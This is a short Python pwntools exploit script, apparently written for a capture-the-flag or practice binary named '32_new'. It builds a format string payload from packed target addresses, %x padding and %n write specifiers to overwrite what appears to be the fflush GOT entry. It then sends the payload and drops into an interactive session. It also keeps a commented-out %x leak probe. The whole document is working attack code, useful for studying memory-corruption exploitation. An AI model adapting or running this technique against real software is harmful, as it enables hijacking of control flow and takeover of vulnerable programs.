#Import pwntools
from pwn import *

#Establish the target process, or network connection
target = process('./32_new')

pid = util.proc.pidof(target)[0]
print("The pid is " + str(pid))
util.proc.wait_for_debugger(pid)

#Print the first line of text
target.recvline()

#Establish the addresses which we will be writing to
fflush_adr0 = p32(0x0804a028)
fflush_adr1 = p32(0x0804a029)
fflush_adr2 = p32(0x0804a02b)

#Establish the amount of bytes needed to be printed in order to write correct value
flag_val0 = b"%185x"
flag_val1 = b"%892x"
flag_val2 = b"%129x"

#Establish the necessary inputs for our input, so we can write to the addresses
fmt_string0 = b"%10$n"
fmt_string1 = b"%11$n"
fmt_string2 = b"%12$n"

#Form the payload
#payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + flag_val0 + fmt_string0 + flag_val1 + fmt_string1 + flag_val2 + fmt_string2
payload = fflush_adr0 + fflush_adr1 + flag_val0 + fmt_string0 + flag_val1 + fmt_string1

# payload = b"000011112222.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"
#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()